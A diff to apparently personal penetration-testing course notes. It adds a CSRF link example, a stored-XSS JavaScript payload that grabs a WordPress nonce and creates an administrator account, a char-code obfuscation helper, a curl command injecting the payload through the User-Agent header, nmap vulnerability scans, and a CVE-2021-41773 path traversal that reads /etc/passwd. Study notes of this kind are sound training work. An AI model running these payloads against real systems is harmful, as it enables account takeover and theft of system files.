@@ -292,7 +292,41 @@
       - DOM-based: page’s DOM is modified with user-controlled values  
       - identify XSS: input accepts unsanitized input `< > ' " { } ;`. URL encoding (space-%20) & HTML encoding (\-&lt;) interprete as code  
       - User-Agent `<script>alert(1)</script>`  
-      - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'
+      - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'  
+      - CSRF: `<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>`  
+      - Create a new WordPress Admin account  
+        - exploit /wp-admin/user-new.php, retrieve nonce value in HTTP response based on the regular expression `var nonceRegex = /ser" value="([^"]*?)"/g;`    
+        ```
+        var params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+        ajaxRequest = new XMLHttpRequest();
+        ajaxRequest.open("POST", requestURL, true);
+        ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        ajaxRequest.send(params);
+        ```
+        - minify attack code into a one-liner via [JS Compress](https://jscompress.com/). Encode the minified Javascript code  
+        ```
+        function encode_to_javascript(string) {
+          var input = string
+          var output = '';
+          for(pos = 0; pos < input.length; pos++) {
+          output += input.charCodeAt(pos);
+          if(pos != (input.length - 1)) {
+          output += ",";
+          }
+          }
+          return output;
+          }
+          let encoded = encode_to_javascript('insert_minified_javascript')
+          console.log(encoded)
+        ```
+        - launch attack on user-agent field  
+        ```
+        curl -i http://offsecwp --user-agent
+        "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,1
+        ...))</script>" --proxy 127.0.0.1:8080
+        ```  
+        - XSS stored in the WordPress DB. Login WP as admin, then click the visitor plugins
+        
     - Cross-site scripting
     - Cross-site scripting
     - Cross-site scripting
@@ -448,7 +482,16 @@
     snmpwalk -c public -v1 192.168.165.151 1.3.6.1.2.1.25.4.2.1.2
     ```
   - enumerate interface descriptions with ASCII decoding (hex to ASCII)  
-    `snmpwalk -c public -v1 -t 10 -Oa 192.168.165.151`  
+    `snmpwalk -c public -v1 -t 10 -Oa 192.168.165.151`
+
+### Vulnerability Scanning  
+- 7.3.1 NSE vulnerability script
+  `sudo nmap -sV -p 443 --script "vuln" 192.168.173.13`
+- 7.3.2 working with NSE script
+  [Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)](https://www.exploit-db.com/exploits/50383)
+  `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`
+  `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.173.13`
+  `curl -s --path-as-is http://192.168.173.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  
 
 ### Password Attacks  
 - 16.1.1 SSH and RDP
